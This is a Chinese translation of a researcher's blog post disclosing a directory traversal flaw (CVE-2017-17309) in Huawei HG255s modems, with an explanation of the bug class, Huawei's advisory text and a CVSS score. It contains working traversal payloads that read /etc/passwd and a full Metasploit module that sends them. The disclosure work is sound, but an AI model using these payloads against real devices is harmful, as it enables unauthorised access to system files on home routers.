<html>
<head>
<title>Directory Traversal Vulnerability in Huawei HG255s Products</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">华为HG255s产品中的目录遍历漏洞</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/directory-ttraversal-vulnerability-in-huawei-hg255s-products-dce941a1d015?source=collection_archive---------1-----------------------#2022-12-17">https://infosecwriteups.com/directory-ttraversal-vulnerability-in-huawei-hg255s-products-dce941a1d015?source=collection_archive---------1-----------------------#2022-12-17</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/5ef2c4b27ca8d65f8468272618926067.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AODRtSrd8KXXt7sug4yWBA.jpeg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">华为HG255s</figcaption></figure><p id="27c8" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我想谈谈我们过去发现的一个漏洞。我想重新发布这个不错的安全研究，这样它就可以在我的博客上。我们发现的这个产品实际上属于Turkcell，它是土耳其的一家国内互联网基础设施提供商。它将这种调制解调器作为标准调制解调器提供给互联网用户。这就是为什么我们可以说有数百万人在使用它。此外，华为还专门为Turkcell开发了这款产品。因此，考虑针对某个国家使用的特定产品的网络攻击的可能性。幸运的是，我们善意的安全研究人员已经报告了这一情况。当我们对该产品进行安全研究时，我们注意到了目录遍历漏洞并报告了该漏洞。我甚至为这个漏洞开发了一个metasploit模块。</p><p id="b872" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">目录遍历，也称为“文件路径遍历”或“点点斜杠”，是一种漏洞，使得攻击者能够访问存储在web应用程序根目录之外的文件和目录。当web应用程序没有正确验证用户输入时，就会出现此漏洞，使得攻击者能够操纵文件路径来访问根目录以外的文件和目录。</p><p id="9990" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">例如，考虑一个允许用户将图像上传到“照片”目录的web应用程序。如果web应用程序没有正确验证上传图像的文件路径，攻击者可能会上传带有恶意文件路径的图像，例如“../../etc/passwd "，试图访问系统的密码文件。这种类型的攻击是可能的，因为“../”序列告诉web应用程序向上一级目录。通过使用多个“../”序列，攻击者可以遍历多个级别，并可能访问存储在web应用程序根目录之外的敏感文件和目录。</p><p id="1bf6" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">为了防止目录遍历漏洞，对于web开发人员来说，正确验证和净化用户输入以确保它不包含任何恶意文件路径是非常重要的。这可以通过使用输入验证、白名单和净化等技术来实现。通过对敏感文件和目录设置适当的权限来防止未经授权的访问，从而适当地保护文件系统也很重要。</p><p id="bf0c" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">安全漏洞的原因是什么？</p><p id="7c85" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">当您检查下面的metasploit模块时，4个不同的目录受到此漏洞的影响；</p><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="44e6" class="lj lk iq lf b be ll lm l ln lo">'/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',<br/>'/lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',<br/>'/res/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',<br/>'/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'</span></pre><blockquote class="lp lq lr"><p id="0194" class="kc kd ls ke b kf kg kh ki kj kk kl km lt ko kp kq lu ks kt ku lv kw kx ky kz ij bi translated"><strong class="ke ir">华为为我们发布的文章:</strong></p></blockquote><p id="3cf2" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">华为注意到安全研究员Ahmet Mersin披露了华为HG255s中的一个<strong class="ke ir">目录遍历漏洞</strong>。在此之前，安全研究人员Bar aryldlrm、Ahmet Mersin和Ismail Tasdelen已经向华为PSIRT发送了该漏洞。华为立即展开彻查。</p><p id="e068" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">华为已经完成调查。<strong class="ke ir">华为HG255s </strong>受此漏洞影响(<strong class="ke ir">CVE-2017–17309</strong>)，华为已经向受影响的运营商提供了修复方案。运营商发布了一个固定版本。受影响的产品将收到系统更新提示，用户可以安装更新来修复漏洞。</p><figure class="la lb lc ld gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lw"><img src="../Images/0dc16a6821727e443cfc4eb0060b6424.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*g8HYCgpP6jf7RPElIvgFpQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">CVE-2017–17309</figcaption></figure><p id="37ff" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们对巴尔扎尔德勒姆、艾哈迈德·梅尔辛和伊斯梅尔·塔斯德伦对华为产品的关注表示感谢。</p><blockquote class="lp lq lr"><p id="80a4" class="kc kd ls ke b kf kg kh ki kj kk kl km lt ko kp kq lu ks kt ku lv kw kx ky kz ij bi translated"><strong class="ke ir">概念验证视频:</strong></p></blockquote><figure class="la lb lc ld gt jr"><div class="bz fp l di"><div class="lx ly l"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">漏洞0lab youtube频道</figcaption></figure><blockquote class="lp lq lr"><p id="3a92" class="kc kd ls ke b kf kg kh ki kj kk kl km lt ko kp kq lu ks kt ku lv kw kx ky kz ij bi translated"><strong class="ke ir"> CVSS评分:</strong></p></blockquote><p id="0eb8" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><em class="ls">基础分:</em><strong class="ke ir"><em class="ls"/></strong><em class="ls">7.5高</em></p><p id="5b54" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><em class="ls">CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</em></p><blockquote class="lp lq lr"><p id="e82f" class="kc kd ls ke b kf kg kh ki kj kk kl km lt ko kp kq lu ks kt ku lv kw kx ky kz ij bi translated"><strong class="ke ir"> Metasploit代码:</strong></p></blockquote><pre class="la lb lc ld gt le lf lg bn lh li bi"><span id="7582" class="lj lk iq lf b be ll lm l ln lo">##<br/># This file is part of the Metasploit Framework and may be subject to<br/># redistribution and commercial restrictions. Please see the Metasploit<br/># web site for more information on licensing and terms of use.<br/>#<br/>##<br/><br/><br/>class MetasploitModule &lt; Msf::Auxiliary<br/>   include Msf::Exploit::Remote::HttpClient<br/><br/>   def initialize<br/>       super(<br/>           'Name'        =&gt; 'Huawei HG255 Directory Traversal',<br/>           ‘Description’ =&gt; ‘Server Directory Traversal at Huawei HG255 by malicious GET requests’,<br/>           ‘Author’      =&gt; ‘Ismail Tasdelen’,<br/>           ‘License’     =&gt; MSF_LICENSE,<br/>           ‘References’     =&gt;<br/>           [<br/>              ['CVE', '2017-17309' ],<br/>              ['URL', 'https://www.huawei.com/en/psirt/security-notices/huawei-sn-20170911-01-hg255s-en']<br/>           ]<br/>       )<br/>       register_options(<br/>           [<br/>               Opt::RPORT(80)<br/>           ], self.class<br/>       )<br/>   end<br/><br/>   def run<br/>       urllist=[<br/>           ‘/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd’,<br/>           ‘/lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd’,<br/>           ‘/res/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd’,<br/>           ‘/css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd’]<br/><br/>       urllist.each do |url|<br/>           begin<br/>               res = send_request_raw(<br/>               {<br/>                       ‘method’=&gt; ‘GET’,<br/>                       ‘uri’=&gt; url<br/>               })<br/><br/>               if res<br/>                   print_good(“Vulnerable! for #{url}”)<br/>               else<br/>                   print_status(“Vulnerable(no response) detected for #{url}”)<br/>               end<br/>           rescue Errno::ECONNRESET<br/>               print_status(“Vulnerable(rst) detected for #{url}”)<br/>           rescue Exception<br/>               print_error(“Connection failed.”)<br/>           end<br/>       end<br/>   end</span></pre><blockquote class="lp lq lr"><p id="0afe" class="kc kd ls ke b kf kg kh ki kj kk kl km lt ko kp kq lu ks kt ku lv kw kx ky kz ij bi translated"><strong class="ke ir">修改历史:</strong></p></blockquote><p id="fa1a" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">2018–06–06v 1.1更新更新安全公告描述信息</p><p id="e15f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">2017年9月11日1.0版初始</p><blockquote class="lp lq lr"><p id="9584" class="kc kd ls ke b kf kg kh ki kj kk kl km lt ko kp kq lu ks kt ku lv kw kx ky kz ij bi translated"><strong class="ke ir">感谢信:</strong></p></blockquote><figure class="la lb lc ld gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lz"><img src="../Images/7519395c34a8e2921daf8dbd3083202f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nqA1YLamv4u2zQMKh9ANEw.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated"><strong class="bd ma">致谢函</strong></figcaption></figure><blockquote class="lp lq lr"><p id="e5d6" class="kc kd ls ke b kf kg kh ki kj kk kl km lt ko kp kq lu ks kt ku lv kw kx ky kz ij bi translated"><strong class="ke ir">参考文献:</strong></p></blockquote><div class="mb mc gp gr md me"><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-17309" rel="noopener  ugc nofollow" target="_blank"><div class="mf ab fo"><div class="mg ab mh cl cj mi"><h2 class="bd ir gy z fp mj fr fs mk fu fw ip bi translated">NVD</h2><div class="ml l"><h3 class="bd b gy z fp mj fr fs mk fu fw dk translated">已修改自NVD上次分析以来，此漏洞已被修改。它正在等待重新分析…</h3></div><div class="mm l"><p class="bd b dl z fp mj fr fs mk fu fw dk translated">nvd.nist.gov</p></div></div><div class="mn l"><div class="mo l mp mq mr mn ms jw me"/></div></div></a></div><div class="mb mc gp gr md me"><a href="https://github.com/exploit-labs/huawei_hg255s_exploit" rel="noopener  ugc nofollow" target="_blank"><div class="mf ab fo"><div class="mg ab mh cl cj mi"><h2 class="bd ir gy z fp mj fr fs mk fu fw ip bi translated">GitHub-exploit-labs/华为_hg255s_exploit:🚀华为HG255s ☄️的服务器目录遍历…</h2><div class="ml l"><h3 class="bd b gy z fp mj fr fs mk fu fw dk translated">🚀华为HG255s ☄️的服务器目录遍历- CVE-2017-17309🚀-GitHub-exploit-labs/Huawei _ Hg 255s _ exploit:🚀…</h3></div><div class="mm l"><p class="bd b dl z fp mj fr fs mk fu fw dk translated">github.com</p></div></div><div class="mn l"><div class="mt l mp mq mr mn ms jw me"/></div></div></a></div><div class="mb mc gp gr md me"><a href="http://www.huawei.com/en/psirt/security-notices/huawei-sn-20170911-01-hg255s-en" rel="noopener  ugc nofollow" target="_blank"><div class="mf ab fo"><div class="mg ab mh cl cj mi"><h2 class="bd ir gy z fp mj fr fs mk fu fw ip bi translated">华为-sn-20170911-01-hg255s-en</h2><div class="ml l"><h3 class="bd b gy z fp mj fr fs mk fu fw dk translated">本网站使用cookies。通过继续浏览网站，您同意我们使用cookies。阅读我们的隐私…</h3></div><div class="mm l"><p class="bd b dl z fp mj fr fs mk fu fw dk translated">www.huawei.com</p></div></div><div class="mn l"><div class="mu l mp mq mr mn ms jw me"/></div></div></a></div><div class="mb mc gp gr md me"><a href="https://www.exploit-db.com/exploits/47923" rel="noopener  ugc nofollow" target="_blank"><div class="mf ab fo"><div class="mg ab mh cl cj mi"><h2 class="bd ir gy z fp mj fr fs mk fu fw ip bi translated">攻击性安全利用数据库档案</h2><div class="ml l"><h3 class="bd b gy z fp mj fr fs mk fu fw dk translated">华为HG255 -目录遍历(Metasploit)..硬件平台的webapps漏洞</h3></div><div class="mm l"><p class="bd b dl z fp mj fr fs mk fu fw dk translated">www.exploit-db.com</p></div></div><div class="mn l"><div class="mv l mp mq mr mn ms jw me"/></div></div></a></div><div class="mb mc gp gr md me"><a href="https://www.vulnerability-lab.com/show.php?user=Ismail+Tasdelen" rel="noopener  ugc nofollow" target="_blank"><div class="mf ab fo"><div class="mg ab mh cl cj mi"><h2 class="bd ir gy z fp mj fr fs mk fu fw ip bi translated">安全漏洞研究实验室</h2><div class="ml l"><h3 class="bd b gy z fp mj fr fs mk fu fw dk translated">安全漏洞研究实验室</h3></div><div class="mm l"><p class="bd b dl z fp mj fr fs mk fu fw dk translated">漏洞实验室-LABORATORYwww.vulnerability-lab.com安全漏洞研究</p></div></div></div></a></div><figure class="la lb lc ld gt jr gh gi paragraph-image"><div class="gh gi mw"><img src="../Images/49c1f6f7816f41206441555b10934760.png" data-original-src="https://miro.medium.com/v2/resize:fit:960/1*QP53S4NHt6Ka3PoyeQS_cg.gif"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">BB-8机器人</figcaption></figure><p id="6b55" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在这篇文章中，我谈到了我们发现的漏洞和我开发的利用程序。保重，在我的下一篇文章中再见。</p></div><div class="ab cl mx my hu mz" role="separator"><span class="na bw bk nb nc nd"/><span class="na bw bk nb nc nd"/><span class="na bw bk nb nc"/></div><div class="ij ik il im in"><h2 id="9f10" class="ne lk iq bd ma nf ng dn nh ni nj dp nk kn nl nm nn kr no np nq kv nr ns nt nu bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae nv" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>